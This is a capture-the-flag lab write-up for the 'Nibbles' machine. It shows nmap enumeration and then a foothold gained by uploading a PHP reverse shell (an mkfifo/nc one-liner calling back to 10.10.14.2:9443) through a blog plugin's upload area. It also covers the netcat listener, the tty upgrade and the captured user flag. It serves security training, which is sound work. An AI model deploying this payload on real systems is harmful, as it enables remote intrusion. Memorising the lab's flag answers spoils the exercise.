### Nibbles Enumeration
 
IP: 10.129.200.170
 
---
 
### Question 1:
Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)
 
Running an nmap scan against the target, I can see that the Apache version is 2.4.18 on Ubuntu.
 
```diff
+ $ nmap 10.129.200.170 -sV -sT -sC -A
```
 
	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey:
	|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
	|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
	|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-title: Site doesn't have a title (text/html).
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
&#x1F6A9; found **2.4.18**.
 
---
 
### Nibbles Foothold
 
IP: 10.129.200.170
 
---
 
### Question 1:
Gain a foothold on the target and submit the user.txt flag.
 
I start off by navigating to admin.php as spoken about in the section and use the credentials covered. Afterwards I go to the plugins area and see the mentioned upload area. I create a myimage.php and write a reverse shell for it.
 
```diff
+ <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```
 
I then set up a listener.
 
```diff
+ $ nc -lvnp 9443
```
 
Once that's done, I upload the file and go to where it was uploaded, which, when I select it, establishes a connection to my netcat listener.
 
```diff
+ $ nc -lvnp 9443
+ [connection established]
+ $ ls
```
 
	Listening on 0.0.0.0 9443
	Connection received on 10.129.69.186 49992
	@1
	db.xml
	image.php
 
From here, I upgrade to a tty shell, making navigation easier.
 
```diff
+ $ python3 -c 'import pty; pty.spawn("/bin/bash")'
```
 
Finally, I navigate to my user's home and find the user.txt.
 
```diff
+ nibbler@Nibbles:/home/nibbler$ ls
+ nibbler@Nibbles:/home/nibbler$ cat user.txt
```
 
	personal.zip  user.txt
	79c03865431abf47b90ef24b9695e148
 
&#x1F6A9; found **79c03865431abf47b90ef24b9695e148**.


